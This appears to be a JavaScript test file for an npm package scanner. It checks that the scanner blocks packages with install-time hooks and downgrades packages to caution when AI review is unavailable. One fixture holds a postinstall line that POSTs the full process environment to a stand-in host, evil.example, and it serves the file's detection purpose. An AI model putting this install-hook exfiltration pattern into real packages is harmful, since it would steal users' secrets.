import test from "node:test";
import assert from "node:assert/strict";
import { analyzePackage, addAiUnavailableFinding } from "../src/analysis.js";
import { decideVerdict } from "../src/verdict.js";

function fakeSnapshot(manifest) {
  return {
    spec: { name: "sketchy", wanted: "latest" },
    manifest,
    packageCreatedAt: new Date().toISOString(),
    versionPublishedAt: new Date().toISOString(),
    downloads: { downloads: 7 },
  };
}

test("analysis detects install-time environment exfiltration", () => {
  const manifest = {
    name: "sketchy",
    version: "1.0.0",
    scripts: { postinstall: "node postinstall.js" },
    bin: "cli.js",
  };
  const inspection = {
    findings: [],
    fileCount: 3,
    totalUnpackedBytes: 1000,
    packageJson: manifest,
    selectedFiles: [
      {
        path: "postinstall.js",
        text: "fetch('https://evil.example/collect', { method: 'POST', body: JSON.stringify(process.env) })",
        size: 96,
        truncated: false,
        reasons: ["postinstall script target"],
      },
    ],
  };

  const analysis = analyzePackage(fakeSnapshot(manifest), inspection);
  assert.equal(analysis.needsAi, true);
  assert.ok(analysis.findings.some((finding) => finding.code === "possible_secret_exfiltration"));
  assert.ok(analysis.findings.some((finding) => finding.code === "lifecycle_hook"));

  const verdict = decideVerdict(analysis, { status: "skipped" });
  assert.equal(verdict.verdict, "block");
});

test("missing AI review for lifecycle hooks becomes caution", () => {
  const manifest = {
    name: "cautious",
    version: "1.0.0",
    scripts: { postinstall: "node install.js" },
    bin: "cli.js",
  };
  const inspection = {
    findings: [],
    fileCount: 2,
    totalUnpackedBytes: 500,
    packageJson: manifest,
    selectedFiles: [{ path: "install.js", text: "console.log('install')", size: 22, truncated: false, reasons: [] }],
  };

  const analysis = analyzePackage(fakeSnapshot(manifest), inspection);
  const withAiUnavailable = addAiUnavailableFinding(analysis, "not configured");
  const verdict = decideVerdict(withAiUnavailable, { status: "unavailable", reason: "not configured" });
  assert.equal(verdict.verdict, "caution");
  assert.ok(withAiUnavailable.findings.some((finding) => finding.code === "ai_unavailable"));
});